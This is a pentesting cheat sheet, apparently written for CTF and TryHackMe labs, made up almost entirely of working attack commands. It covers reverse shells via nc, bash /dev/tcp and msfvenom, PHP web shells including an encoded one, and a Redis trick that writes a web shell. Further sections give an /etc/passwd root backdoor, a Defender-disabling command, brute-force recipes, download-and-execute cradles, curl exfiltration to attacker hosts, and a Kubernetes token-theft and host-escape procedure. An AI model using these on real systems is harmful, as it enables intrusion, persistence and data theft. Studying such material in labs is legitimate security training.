# Tips and Tricks

Just various bits of script and techniques I've found useful.

My [setup script](https://github.com/ChrisPritchard/ctf-writeups/blob/master/thm-setup.sh) for THM Attack Boxes: 

```bash
curl -s https://raw.githubusercontent.com/ChrisPritchard/ctf-writeups/master/thm-setup.sh | bash
```

- Static binaries: https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
- passwd user to add (pass123): `echo 'user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root:/bin/bash' >> /etc/passwd` (note the single quotes so $ is ignored)
- ssh shuttle (to a machine with ssh AND python): `sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET` (ssh command is required if you need a keyfile)
- listen for pings: `tcpdump -i eth0 icmp`
- scp over a jump host for the attack box (which has older scp): `scp -o 'ProxyJump your.jump.host' myfile.txt remote.internal.host:/my/dir`
- disable defender from powershell as an admin on windows: `Set-MpPreference -DisableRealtimeMonitoring $true`

## Top external resources

- [HackTricks by Carlos Polop (same guy behind linpeas)](https://book.hacktricks.xyz/)
- [Binary Exploitation notes](https://ir0nstone.gitbook.io/notes/)
- [My GDB tips and tricks](https://github.com/ChrisPritchard/ctf-writeups/blob/master/GDB-TIPS-AND-TRICKS.md)
- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [Revshells - a rev shell generator](https://www.revshells.com/)
- [GTFObins - linux privesc via living off the land](https://gtfobins.github.io/)
- [LOLBAS - same as above but for windows](https://lolbas-project.github.io/#)
- [WADComs - AD stuff](https://wadcoms.github.io/)
- [StegOnline - beyond simple steghide](https://stegonline.georgeom.net/image)

## Reverse shells

If netcat with -e exists (nc.traditional, very rare in CTFs, in my experience) or if the static ncat binary has been copied across:

`nc -e /bin/bash 10.4.0.7 4444`

Otherwise, assuming nc is present:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.0.7 4444 >/tmp/f`

Pure bash if /dev/tcp is available (rare on CTFs):

`bash -i >& /dev/tcp/10.4.0.7/4444 0>&1`

Via msfvenom (still calling back to a nc listener), creating an executable called connect:

`msfvenom -p linux/x64/shell_reverse_tcp lhost=10.4.0.7 lport=4444 -f elf > connect`

For Windows:

`msfvenom -p windows/shell_reverse_tcp LHOST=10.4.0.7 LPORT=4444 EXITFUNC=thread -f exe-only > shell4444.exe`

Otherwise use https://www.revshells.com/

If you do have python RCE, but the above is too weighty or you want something more concise, consider:

`import os; os.system("<any of the shell commands above>")`

## Creating authorized keys

1. create the `.ssh` folder using mkdir
2. echo your public key into `.ssh/authorized_keys`
3. `chmod 700 ~/.ssh`
4. `chmod 600 ~/.ssh/authorized_keys`

## SSH Proxies

**local port forwarding**: the target host 192.168.0.100 is running a service on port 8888, and you want that service available on the localhost port 7777

`ssh -L 7777:localhost:8888 user@192.168.0.100`

**remote port forwarding**: you are running a service on localhost port 9999, and you want that service available on the target host 192.168.0.100 port 12340

`ssh -R 12340:localhost:9999 user@192.168.0.100`

**Local proxy** through remote host: You want to route network traffic through a remote host target.host, so you create a local socks proxy on port 12001 and configure the SOCKS5 settings to localhost:1080

`ssh -C2qTnN -D 1080 user@target.host`

(args above are compression level, quiet, run in background and no command should be run)

**Double pivoting**, opening a socks proxy on a remote machine and forwarding that proxy so its accessible locally:

`ssh -tt -L8080:localhost:8157 sean@10.11.1.251 ssh -t -D 8157 mario@10.1.1.1 -p 222`

## Chisel

Can be used to get a reverse proxy. Useful for pivoting, opens a socks proxy from the target to your attack box, basically so the attack box has a proxy to the target's network.

1. Get chisel, via its release page: https://github.com/jpillora/chisel/releases/tag/v1.7.6
2. Get a copy on the target and the attack box. 
3. Create a server on the attack box: `./chisel server -p 1337 --reverse &`
4. From the target, connect to the attack box via `./chisel client ATTACK-BOX-IP:1337 R:socks &`

This will open a proxy on 1080, which you can then setup via proxychains etc.

For straight forwarding ports back, its the same server command as above, plus `./chisel client ATTACK-BOX-IP:1337 R:ATTACK-BOX-PORT:TARGET-IP:TARGET-PORT &`

E.g. if an http server is on the target but otherwise not reachable, I could move it to the attack box with `R:8001:127.0.0.1:80`, so localhost:8001 on the attack box would forward to :80 on the target

## Shell tricks

making a bad reverse shell better:

`python -c 'import pty; pty.spawn("/bin/bash")'`

also if python3 is required:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

if the shell is doing that weird echoing thing, then after running the above, the following can fix this:

```
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
```

the above also prevents Ctrl + C killing the reverse shell. if the shell dies, your shell will be boned as no commands sent will be returned. to fix this: type reset and press enter (Thanks TryHackMe)

if python, perl etc are not available (or not accessible by www-data or whoever), but you can wget, then wget socat:

```
wget -q http://ATTACKER_IP:8000/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
export TERM=xterm-256color
export SHELL=bash
```

catching better shells by default (needs rlwrap to be installed):

`rlwrap nc -lvnp <port>`

bypassing url encoding if doing something sneaky like get[cmd]:

`echo urlencoded | base64 -d > shell.php`

creating a windows exe that will call home:

`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.100.16 LPORT=4443 -f exe -o callhome.exe`

## Web shells

PHP one liner:

`<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`

Tighter: 

`<?php echo shell_exec($_GET['e'].' 2>&1'); ?>`

No quotes:

`<?php system($_GET[1]); ?>`

PHP interactive shell:

```
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
<script>document.getElementById("cmd").focus();</script>
```

shell above emitted to a file via base64:

```
echo %50%47%5a%76%63%6d%30%67%62%57%56%30%61%47%39%6b%50%53%4a%48%52%56%51%69%49%47%35%68%62%57%55%39%49%6a%77%2f%63%47%68%77%49%47%56%6a%61%47%38%67%59%6d%46%7a%5a%57%35%68%62%57%55%6f%4a%46%39%54%52%56%4a%57%52%56%4a%62%4a%31%42%49%55%46%39%54%52%55%78%47%4a%31%30%70%4f%79%41%2f%50%69%49%2b%43%6a%78%70%62%6e%42%31%64%43%42%30%65%58%42%6c%50%53%4a%55%52%56%68%55%49%69%42%75%59%57%31%6c%50%53%4a%6a%62%57%51%69%49%47%6c%6b%50%53%4a%6a%62%57%51%69%49%48%4e%70%65%6d%55%39%49%6a%67%77%49%6a%34%4b%50%47%6c%75%63%48%56%30%49%48%52%35%63%47%55%39%49%6c%4e%56%51%6b%31%4a%56%43%49%67%64%6d%46%73%64%57%55%39%49%6b%56%34%5a%57%4e%31%64%47%55%69%50%67%6f%38%4c%32%5a%76%63%6d%30%2b%43%6a%78%77%63%6d%55%2b%43%6a%77%2f%63%47%68%77%43%69%41%67%49%43%42%70%5a%69%68%70%63%33%4e%6c%64%43%67%6b%58%30%64%46%56%46%73%6e%59%32%31%6b%4a%31%30%70%4b%51%6f%67%49%43%41%67%65%77%6f%67%49%43%41%67%49%43%41%67%49%48%4e%35%63%33%52%6c%62%53%67%6b%58%30%64%46%56%46%73%6e%59%32%31%6b%4a%31%30%70%4f%77%6f%67%49%43%41%67%66%51%6f%2f%50%67%6f%38%4c%33%42%79%5a%54%34%4b%50%48%4e%6a%63%6d%6c%77%64%44%35%6b%62%32%4e%31%62%57%56%75%64%43%35%6e%5a%58%52%46%62%47%56%74%5a%57%35%30%51%6e%6c%4a%5a%43%67%69%59%32%31%6b%49%69%6b%75%5a%6d%39%6a%64%58%4d%6f%4b%54%73%38%4c%33%4e%6a%63%6d%6c%77%64%44%34%3d | base64 -d > shell.php
```

## Redis trick

if you have access to redis (port 6379) and a handy reachable location (e.g. if you know a user and have port 22, or a website you know or can guess the dir of), the following technique (from one of redis' authors!) can work:

https://dl.packetstormsecurity.net/1511-exploits/redis-exec.txt

For the latter method, a website, the following are the steps:

1. install the redis-cli on your attacking machine. `sudo apt install redis-tools`
2. connect to the server: `redis-cli -h 10.10.8.4`
3. run the following commands to set and save the database:

        - config set dir /var/www/html
        - config set dbfilename "shell.php"
        - set 1 "<?php echo shell_exec($_GET['e'].' 2>&1'); ?>"
        - save
4. all going well, navigate to /shell.php?e=id on the webserver and see if the username has shown up
5. because of how mangled the file is, and the simplicity of the web shell, if you want to catch a reverse shell remember to url encode the payload you add to `?e=`

## Brute forcing with hydra, cewl, patator

CeWL generates a wordlist from a page. `cewl 192.168.154.10 > words.txt` will create a mini list, which was useful in one challenge based on bruteforcing with this list.

For hydra, `-l` specifies a username, `-L` a username source file, `-p` a password and `-P` a password list

SSH or FTP (swap the last bit by protocol):

`hydra -L users.txt -P passwords.txt 192.168.154.10 ssh`

Basic auth:

`hydra -l rascal -P /usr/share/wordlists/rockyou.txt -f 10.10.238.52 http-get`

Regular login form (for wordpress dont do this, just use wp-scan with the -U, -P options):

`hydra -l admin -P ./rockyou.txt 10.10.207.186 http-post-form "/Account/login.php:username=^USER^&password=^PASS^&login=login:Login failed"`

The below targets an aspx page, that needed viewstate to go with it in order to get the error message back:

`hydra -l admin -P ./rockyou.txt 10.10.207.186 http-post-form "/Account/login.aspx:__VIEWSTATE=pIru3H%2F3LYg1qp3lNSwHX1ALuENNV6tddZ32Zp4xRIs57ec4jlYH9sp8EHtZ0sp66EsCaToBXZLEbw62lNBT7XuKpv84ZHetBU3stATD5DYczl9JagBTENtoK%2B6lyNFyDsrRWb34%2F9jXclG%2FsQWa1tJXjQAYZJP2MJNhNaH2WMIL%2FQf9&__EVENTVALIDATION=lQWGlUQ0Fmhz%2BuiWoqOKaexWGfGTltskH%2FV3RsXfmd%2B8N5m8JCLGWXUm7pFZQj0G0QjJMd3MLudMx0zUAlot%2BanlZVtlggDnm3e%2B2DNiDwnhrETOWRZdwtNypSULvwzs8ZlD1SiHFFPASQz1PJN12l5Fi3uL4UCohXb%2BBjCo1nU5Sz7I&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"`

If a CSRF is required, then `patator` works better:

`patator http_fuzz method=POST --threads=1 timeout=5 url="http://10.11.1.11/scp/login.php" body="__CSRFToken__=_CSRF_&do=scplogin&userid=helpdesk&passwd=COMBO00&submit=Log+In" 0=/usr/share/wordlists/rockyou.txt before_urls="http://10.11.1.11/scp/login.php" before_egrep='_CSRF_:<input type="hidden" name="__CSRFToken__" value="(\w+)" />' -x ignore:fgrep='Access denied' proxy="http://127.0.0.1:8080" header="Cookie: OSTSESSID=s23pkfp9o9mo10kb8bea33ie76"`

Another example, CSRF with `patator` (note sites like [pythex](https://pythex.org/) are good for getting the regex for csrf right - invalid regex results in NoneType has no attribute group etc errors):

`patator http_fuzz method=POST --threads=1 timeout=5 url="http://10.11.2.245/index.php" body="__csrf_magic=_CSRF_&action=login&login_username=admin&login_password=COMBO00" 0=/usr/share/wordlists/rockyou.txt before_urls="http://10.11.2.245" before_egrep='_CSRF_:var csrfMagicToken = "([^\"]+)";' -x ignore:fgrep='Invalid' proxy="http://127.0.0.1:8080"`

## Downloading files with windows (or linux missing curl/wget)

without the use of powershell or anything clever. great for pulling files off my attacker machine

```
certutil.exe -urlcache -split -f "http://10.10.139.149:8000/callhome.exe" callhome.exe
certutil.exe -urlcache -split -f "http://10.10.139.149:8000/callhome2.exe" callhome2.exe
certutil.exe -urlcache -split -f "http://10.10.139.149:8000/winPEAS.bat" winPEAS.bat
```

bitsadmin approach:

```
bitsadmin.exe /transfer /Download /priority Foreground https://downloadsrv/10mb.zip c:\\10mb.zip
```

with powershell (first also invokes a script, in this case Invoke-PowerShellTcp from Nishang):

`println "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.100.16:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.100.16 -Port 4444".execute().text`

`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.139.149:8000/callhome.exe','callhome.exe')"`

or more simply, in powershell:

`Invoke-WebRequest -Uri $url -OutFile $output`

using python (if you have it):

`c:\Python27\python.exe -c "import urllib; print urllib.urlopen('http://10.10.50.123:8000/mimikatz_trunk.zip').read()" > mimikatz_trunk.zip`

with php:

`php -r "file_put_contents('/tmp/ncat', file_get_contents('http://10.10.32.12:1234/ncat'));"`

pure bash:

```bash
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

## cracking zips

apart from zip2john and john, there is also `fcrackzip -b --method 2 -D -p rockyou.txt -v extracted.zip`

## Injections

Raw sqlmap will go through all its tests, which might take ages. If you know the test to use, then you can actually specify it in the sqlmap command.

`sqlmap -u "http://10.10.69.3/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --test-filter="MySQL >= 5.0 error-based - Parameter replace (FLOOR)" --random-agent --dump -p list[fullordering]`

In the above, exploiting https://www.exploit-db.com/exploits/42033, I know the param and the test that will work, so I specify both and jump straight to the dumping.

If able to inject some python script, e.g. into unsanitised input, this can work:

`__import__('os').popen('nc 10.10.106.5 4444 -e /bin/sh').read()`

## Other stuff

this will expose an internal only port 22 as a public port 8888

`/tmp/socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22`

this will exfiltrate command outputs if all you have is the ability to make web requests:

`ls -laR ../../../ | base64 -w0 | xargs -I T curl 10.10.149.217:1234/?x=T`

if you have a server or burp collaborator-like functionality, you can retrieve posted files via:

`curl -X POST -F test=@/home/carlos/secret http://pohwe4zygesamfa7r5y0nutip9v1jq.burpcollaborator.net`

Downloading a file with perl

`perl -e 'use LWP::Simple qw(get); echo(get "http://www.grislygrotto.nz")'`

## Padding oracle attacks

use https://github.com/AonCyberLabs/PadBuster
might need to install: `sudo apt-get install libcrypt-ssleay-perl`

command to decrypt some cookie value:  

`./padBuster.pl http://10.10.31.123/index.php TaIt46TG994JDsPmpFp8Q0XovkIFJHY4 8 -cookies hcon=TaIt46TG994JDsPmpFp8Q0XovkIFJHY4 -error "Invalid padding"`

if that works, and the cookie value is something you want to manipulate, you can use the same tool to encrypt via the -plaintext argument:

`./padBuster.pl http://10.10.31.123/index.php TaIt46TG994JDsPmpFp8Q0XovkIFJHY4 8 -cookies hcon=TaIt46TG994JDsPmpFp8Q0XovkIFJHY4 -error "Invalid padding" -plaintext user=administratorhc0nwithyhackme`

## Kubernetes

Steps to get kubectl:

```bash
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
```

If you get RCE in a pod, try to find the secret token from these locations:

```
/run/secrets/kubernetes.io/serviceaccount
/var/run/secrets/kubernetes.io/serviceaccount
/secrets/kubernetes.io/serviceaccount
```

Once you have it, run kubectl like:

```
kubectl --token=$(cat token) --server=https://10.10.175.123:6443 --insecure-skip-tls-verify=true [commands]
```

note the port of **6443**. has also been found as **16433**

for commands, finding out what your privs are would be `auth can-i --list`. Others, like `get secrets -n [namespace]` etc.

Hints from (along with more) this page [https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-pentesting)

### Simple escape with full rights:

- `kubectl get pod <name> [-n <namespace>] -o yaml`
- mod with a new name, tag, and two volume changes:
    
    ```
      volumes:
      - name: host-fs
        hostPath:
          path: /
    ```
    
    and under a container
    
    ```
      volumeMounts:
      - name: host-fs
        mountPath: /root
    ```
- `kubectl apply -f attacker.yaml [-n <namespace>]`
- `kubectl exec -it attacker-pod [-n <namespace>] -- bash`
- `chroot /root /bin/bash`
